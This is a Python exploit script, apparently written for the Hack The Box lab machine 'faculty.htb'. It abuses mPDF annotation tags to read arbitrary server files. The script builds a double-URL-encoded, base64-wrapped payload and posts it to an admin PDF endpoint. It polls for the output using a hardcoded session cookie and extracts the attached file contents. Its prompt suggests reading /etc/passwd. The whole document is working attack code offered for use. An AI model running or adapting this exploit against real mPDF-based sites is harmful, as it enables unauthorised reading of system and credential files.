import time

from PyPDF2 import PdfFileReader
from urllib.parse import quote
from cmd import Cmd
from base64 import b64encode
import requests

def extract_att(pdfFile):
    reader = PdfFileReader(pdfFile)

    for page in reader.pages:
        try :
            for annot in page["/Annots"] :
                ann = annot.getObject()
                print(ann['/FS']['/EF']['/F'].getData().strip().decode('utf-8'))       # (1)
                print ("")
        except :
            # there are no annotations on this page
            pass


class Terminal(Cmd):
    prompt = "\nFile >> "
    def default(self, args):
        payload_gen(args)


def banner():
    banner = """                          _____  _____  ______   ______ ___  __   __                  _       _ _
                         |  __ \|  __ \|  ____| |____  / _ \ \ \ / /                 | |     (_) |
               _ __ ___  | |__) | |  | | |__        / / | | | \ V /    _____  ___ __ | | ___  _| |_
               | '_ ` _ \|  ___/| |  | |  __|      / /| | | |  > <    / _ \ \/ / '_ \| |/ _ \| | __|
               | | | | | | |    | |__| | |        / / | |_| | / . \  |  __/>  <| |_) | | (_) | | |_
               |_| |_| |_|_|    |_____/|_|       /_/ (_)___(_)_/ \_\  \___/_/\_\ .__/|_|\___/|_|\__|
                                                                               | |
                                                                               |_|   """
    print(banner)


def send_post(pdfenc):
    fi = ''
    url = "http://faculty.htb/admin/download.php"
    params = {"pdf": pdfenc}
    req = requests.post(url, data=params)
    if 'Error' in req.text:
        print(f"{req.text}")
    else:
        pdf_file = req.text.strip()
        down_url = f"http://faculty.htb/mpdf/tmp/{pdf_file}"
        print(down_url)
        found = False
        cookie = {'PHPSESSID': 'tdjgh5q88dfhdiiipuu43f0khi'}
        while not found:
            time.sleep(3)
            fi = requests.get(down_url, cookies=cookie)
            print(fi.status_code)
            if fi.status_code == 200:
                found = True
        # print(fi.content)
        file_name = 'file1.pdf'
        with open(file_name, 'wb') as f:
            f.write(fi.content)

        extract_att(file_name)


def payload_gen(fname):
    payload = f'<annotation file="{fname}" content="{fname}" icon="Graph" title="Attached File: {fname}" pos-x="195" />'
    encoded_payload = quote(payload, safe='')
    encoded_payload = quote(encoded_payload)
    base64enc = b64encode(encoded_payload.encode())
    print(f"Base64 encoded payload:\n{base64enc.decode()}\n")
    send_post(base64enc)


if __name__ == "__main__":
    banner()
    print("Enter Filename eg. /etc/passwd")
    terminal = Terminal()
    terminal.cmdloop()
